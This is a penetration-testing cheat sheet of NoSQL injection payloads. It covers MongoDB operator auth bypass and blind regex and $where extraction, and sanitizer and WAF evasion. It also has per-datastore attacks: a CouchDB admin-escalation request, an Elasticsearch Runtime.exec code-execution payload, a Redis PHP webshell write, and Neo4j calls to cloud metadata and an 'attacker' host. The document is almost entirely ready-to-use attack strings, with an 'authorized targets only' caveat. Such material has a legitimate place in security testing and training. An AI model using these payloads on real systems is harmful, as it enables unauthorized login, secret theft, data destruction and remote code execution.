# NoSQL Injection — Attack Arsenal

**Author:** x8bitranjit
Payloads + tool commands for the guide. Authorized targets only. Baseline every test against a control response.

---

## 0. The operator cheat (MongoDB — memorize these)

| Operator | Meaning | Attack use |
|----------|---------|------------|
| `$ne` | not equal | `{"$ne":null}` = match anything → auth bypass |
| `$gt` / `$gte` / `$lt` / `$lte` | comparison | `{"$gt":""}` ~ everything |
| `$regex` | regex match | `.*` = all; `^a` = blind char extraction |
| `$in` / `$nin` | in / not-in set | `{"$in":["admin","root"]}` target list |
| `$exists` | field present | field discovery |
| `$where` | server-side **JS** predicate | blind exfil, `sleep()` timing, DoS |
| `$or` / `$and` / `$not` / `$nor` | logic | breakout / sanitizer bypass (`$not:{$eq:...}`) |
| `$expr` / `$function` / `$accumulator` | expression / JS (4.4+) | JS execution |
| `$elemMatch` / `$all` / `$size` | array ops | array-field injection |

---

## 1. Detection — differential probes

```
# error / special chars (string context):
'   "   `   \   ;   {   }   //   %00   '"`{;$//

# operator differential — TRUE-forcing (expect more/all/login-ok):
param[$ne]=nonexistentvalue
param[$gt]=
param[$gte]=
param[$regex]=.*
param[$exists]=true
param[$nin]=[]

# FALSE-forcing (expect none) — the control for the above:
param[$gt]=zzzzzzzzzzzz
param[$regex]=^$
param[$in]=[]
param[$exists]=false

# JSON-body forms of the same:
{"param":{"$ne":"nonexistentvalue"}}
{"param":{"$regex":".*"}}
{"param":{"$gt":""}}
```

## 2. Authentication bypass

```json
// JSON bodies (Content-Type: application/json)
{"username": {"$ne": null},  "password": {"$ne": null}}
{"username": {"$gt": ""},    "password": {"$gt": ""}}
{"username": "admin",         "password": {"$ne": "x"}}
{"username": "admin",         "password": {"$regex": "^"}}
{"username": {"$in": ["admin","administrator","root","superadmin"]}, "password": {"$ne": 1}}
{"username": {"$not": {"$eq": null}}, "password": {"$not": {"$eq": null}}}   // sanitizer bypass
```
```
# form / bracket bodies (application/x-www-form-urlencoded)
username[$ne]=x&password[$ne]=x
username=admin&password[$ne]=x
username[$gt]=&password[$gt]=
username[$regex]=.*&password[$regex]=.*
```
```
# $where string-concatenation login bypass
username=admin'||'1'=='1
username=admin'||1==1//
password=' || true || '
```

## 3. Blind extraction — $regex boolean (char-by-char)

```json
// confirm each character; response TRUE/FALSE differs (login ok / result present / status/length)
{"username":"admin","password":{"$regex":"^a"}}
{"username":"admin","password":{"$regex":"^ab"}}
{"username":"admin","password":{"$regex":"^abc"}}
// length:
{"username":"admin","password":{"$regex":"^.{32}$"}}
// anchored full-charset loop for tokens (charset: a-zA-Z0-9-_ etc.)
```
```
# form form:
username=admin&password[$regex]=^a
```
Escape regex metacharacters in the KNOWN prefix as you extend (`.`, `+`, `*`, `$`, `^`, `(`, `)`, `[`, `]`, `\`).

## 4. Blind extraction — $where JS (when regex is filtered)

```json
{"$where": "this.password[0]=='a'"}
{"$where": "this.password.charCodeAt(0)>96"}          // binary-search the byte
{"$where": "this.password.match(/^a/)!=null"}
{"$where": "this.username=='admin' && this.password.length==32"}
{"$where": "sleep(3000)"}                              // time oracle (bounded!)
{"$where": "this.user=='admin' && sleep(3000)"}        // blind-boolean via timing
{"$where": "Object.keys(this)"}                        // field discovery
```

## 5. Aggregation / write

```json
{"pipeline":[{"$lookup":{"from":"users","localField":"x","foreignField":"y","as":"z"}}]}   // cross-collection read
{"pipeline":[{"$out":"pwned"}]}          // WRITE (integrity) — avoid on prod
{"$function":{"body":"function(){return true}","args":[],"lang":"js"}}                      // MongoDB 4.4+ JS
```

## 6. Per-datastore

```
# CouchDB Mango — dump all docs:
POST /db/_find  {"selector":{"_id":{"$gt":null}}}
# CVE-2017-12635 privilege escalation (duplicate-key roles):
PUT /_users/org.couchdb.user:hacker  {"type":"user","name":"hacker","roles":["_admin"],"roles":[],"password":"x"}

# Elasticsearch — search injection + scripting RCE:
GET /_search?q=*
POST /_search {"script_fields":{"x":{"script":"java.lang.Runtime.getRuntime().exec('id')"}}}   # CVE-2015-1427 class

# Redis (via SSRF/CRLF) — webshell:
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET x "<?php system($_GET['c']);?>"
SAVE
# or: EVAL "..." 0   (Lua)   |   MODULE LOAD /path/evil.so

# Neo4j Cypher:
' OR 1=1 //
' RETURN 1 as x //
LOAD CSV FROM 'http://169.254.169.254/latest/meta-data/' AS l RETURN l    # SSRF
CALL apoc.load.json('http://attacker/') YIELD value RETURN value
CALL dbms.security.listUsers()

# DynamoDB PartiQL:
' OR '1'='1

# Firebase REST:
GET https://TARGET.firebaseio.com/users.json         # unauth read if rules are open
PUT https://TARGET.firebaseio.com/users/x.json  {"pwned":1}
```

## 7. WAF / sanitizer bypass

```
# express-mongo-sanitize / mongo-sanitize strip keys with $ or . -> nest deeper:
{"username":{"$not":{"$eq":null}}}
# content-type switch: JSON <-> form (username[$ne]=) <-> multipart
# HPP: username=admin&username[$ne]=x
# type juggling: password=0  vs  password="0" ; username[]=admin (array)
# unicode/alternate encodings of the key the sanitizer keys on
```

## 8. Tools

| Tool | Use |
|------|-----|
| **Burp Suite** (repeater/intruder) | Manual operator injection, content-type switch, differential; the primary tool |
| **NoSQLMap** | Automated Mongo/Couch injection + auth bypass + extraction (mock/lab first — noisy) |
| **nosqli** (Go, `github.com/Charlie-belmer/nosqli`) | Focused MongoDB injection scanner |
| **`poc/nosqli_fuzz.py`** | Control-baselined operator-injection detector + auth-bypass tester (JSON + bracket), low-FP |
| **`poc/nosqli_blind.py`** | Blind char-by-char extraction (`$regex` boolean + `$where` time), binary-search |
| **mongo shell / `mongosh`** | Understand the query the app builds; verify operator semantics locally |
| **Interactsh / your OOB** | Time-oracle confirmation, Neo4j/ES/Redis SSRF/RCE callbacks |

> Baseline every probe against a control. A finding = a **steered, repeatable** change (login without password / data out / secret extracted / JS executed) — not a lone 500 or one odd response. Own test accounts; bounded sleeps; redact secrets.
